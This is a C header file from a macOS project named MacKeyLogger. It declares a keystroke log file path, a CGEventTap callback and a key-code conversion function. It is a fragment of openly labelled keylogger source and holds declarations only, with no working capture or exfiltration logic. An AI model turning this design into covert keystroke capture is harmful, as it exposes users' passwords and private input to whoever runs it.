//
//  keylogger.h
//  MacKeyLogger
//
//  Created by Tatsuya Kida on 2/22/17.
//  Copyright © 2017 kidapu. All rights reserved.
//

#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

FILE *logfile = NULL;
//const char *logfileLocation = "/var/log/keystroke.log";
const char *logfileLocation = "/Users/t_kida/Desktop/MacKeyLogger/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int);

#endif